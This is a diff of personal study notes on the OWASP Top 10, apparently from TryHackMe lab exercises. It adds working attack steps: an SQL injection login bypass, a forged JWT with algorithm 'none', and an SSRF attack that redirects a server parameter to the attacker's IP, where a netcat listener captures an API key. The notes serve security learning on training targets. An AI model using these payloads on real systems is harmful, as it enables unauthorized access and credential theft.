@@ -1,9 +1,13 @@
 The [*Open Web Application Security Project (OWASP)*](https://owasp.org) is a non-profit-organistaion dedicated to enhance the security of web services and applications
 
-# 1. Broken Access Control
-Websites have pages not meant to be accessed by regular users. If the authorisatoin can be bypassed and these pages can be accessed the *access control* of the page is broken which can lead to:
+# [1. Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
+Websites have pages not meant to be accessed by regular users. If the authorisation can be bypassed and these pages can be accessed the *access control* of the page is broken which can lead to:
 - view sensitive information from other users
 - gaining unauthorized functionality
+
+There are two categries of *Brocken Access Control*:
+- **Horizontal** Privilege Escalation: perform actions or access data of another user of the same level of permissions
+- **Vertical** Privilege Escalation: perform actions or access data of another user with a higher level of permissions
 
 ## Exercise: Insecure Direct Object Reference (IDOR)
 *Insecure Direct Object Referecne (IDOR)* is a access control vulnerability occuring when a *Direct Object Reference*  to a file, user, etc. is exposed and access to protected resources can be gained.
@@ -60,7 +64,7 @@ sqlite> SELECT * FROM customers;
 5. We copy the password hash of the user `admin` and paste it into [Crackstation](https://crackstation.net/) and get the password `qwertyuiop`
 6. We go back to the login page of the webapplication and enter the username `admin` and password `qwertyuiop`
 
-# 3. Injection
+# [3. Injection](https://owasp.org/Top10/A03_2021-Injection/)
 Injection flaws are very common in web applications and occure when user input are interpreted as commands.
 Some injection examples are:
 - **SQL Injection**: Occurs when user input is passed to SQL queries, manipulating the outcome of these queries, which allows the attacker to access, modify and delete information in the database.
@@ -70,6 +74,22 @@ The main defence against injection attacks is to ensure that user inout is not i
 - **An allow list**: user input is compared to a list of safe inputs or characters and then accepted or rejected
 - **Stripping input**: if the user input contains dangerous characters, they are removed before processing.
 
+## SQL Injection
+A basic example of *SQL injection* is when presented with a login, start [[Burp Suite]] and enter some text.
+After the request was intercepted switch to *Burp Suite* and change the email and password field to:
+```
+{"email":"' or 1=1--"},{"password:"a"}
+```
+**How does it work?**
+1. `'` closes the brackets in the SQL query
+2. `OR` will return true as `1=1` is true, this tells the server the email is valid and will log us into the user with the ID 0, which is the administrator account
+3. `--` is used to comment in SQL, which comments out the any restrictions on the login as they are interpreted as a comment.
+
+**Trying to login as a User**
+When we know a user's email we simply replace `' or 1=1` from abovw with the email:
+```
+{"email":"user@juice-sh.op'--"},{"password:"a"}
+```
 ## Command Injection
 *Command Injection* happens when server-side code (like [PHP](https://www.php.net/manual/de/index.php)) in a web application calls a function that directly interacts with the server's OS console.
 The scenario: A corporation has developed a web application that lets a user input text which will be displayed on the website. They used the a simple program which calls the `cowsay` command from the servers OS console.
@@ -169,7 +189,7 @@ To keep an authentication mechanism safe you should:
 - implement Multi-Factor Authentication, adding for example receiving a code on your smartphone after entering your username and password
 ## Exercise
 We want to enter the account of `darren`, we use an exploit by re-registrating an existing user.
-1. We register a new account with the username ` darren` (notice the space at the beginning)
+1. We register a new account with the username `" darren"` (notice the space at the beginning)
 2. We login with our username and password and have access to `darren`'s account
 # 8. Software and Data Integrity Failures
 Integrity refers to the concept that data has not been modified. As a means to check that downloaded data has not been modified or damaged *hashes* are often sent along. A *hash* or *digest* is the result of a hashing algorithm, such as MD5, SHA1, SHA256, etc., which takes a input and outputs a number of a set length. If a single bit is changed the hash will be different.
@@ -228,9 +248,13 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzE0NzQ
 ```
 5. By double-clicking on the "value" field we can modify the contents
 6. We use the [Base64 Tool](https://appdevtools.com/base64-encoder-decoder) to encode the modified cookie 
+	```
+	eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzE1MTY2NDgzfQ.
+	```
+7. We reload the website and if the cookie where modified correctly we get access to the flag
 
 # 9. Security Logging and Monitoring Failures
-Every action by a user inside a web application should be logged. This is important becuase when an attack occurs, the actvities of him can be traced and the impact can be determined. 
+Every action by a user, inside a web application, should be logged. This is important because when an attack occurs, the actvities of him can be traced and the impact determined. 
 Without logging there could be:
 - **Regulatory damage**: if the attacker gained access to personal data and there is no record, the users are affected and the application owner may be subject to fines or more severe regulations
 - **Risk of further attacks**: if the attacker and his actions are undected, this could allow the attacker to launch further attacks.
@@ -270,5 +294,33 @@ nc -lvp 80
 - Enumerate internal networks, including IP addresses and ports
 - Gain access to restricted services
 - Interact with non-HTTP services to get *Remote Code Execution (RCE)*
-
 ## Exercise 
+1. We visit the target web page and find a "Download Resume" button which exposes the URL of the server where the Resume is stored
+```
+	http://10.10.193.204:8087/download?server=secure-file-storage.com:8087&id=75482342
+```
+1. We copy the link and change the server to our own IP
+```
+	10.10.193.204:8087/download?server=10.10.159.223:8087&id=75482342
+```
+1. We start a netcat listener on the port specified in the URL
+```
+	nc -lvp 8087
+```
+1.  We should then get the API key and the flag
+```
+Connection from ip-10-10-193-204.eu-west-1.compute.internal 36210 received!
+GET /public-docs-k057230990384293/75482342.pdf HTTP/1.1
+Host: 10.10.159.223:8087
+User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
+Accept: */*
+X-API-KEY: THM{Hello_Im_just_an_API_key}
+```
+
+**Bonus Exercise**
+We try to use *SSRF* to get access to the admin area of the web site.
+One way is to modify the URL to download the Resume
+```
+10.10.193.204:8087/download?server=localhost:8087/admin%23&id=75482342
+```
+Changing the server parameter to `localhost:8087/admin` results in a request to the localhost on the given port and the admin page is displayed. The `%23` is URL encoded `#` which commands out the rest of the URL which may not be needed for access.
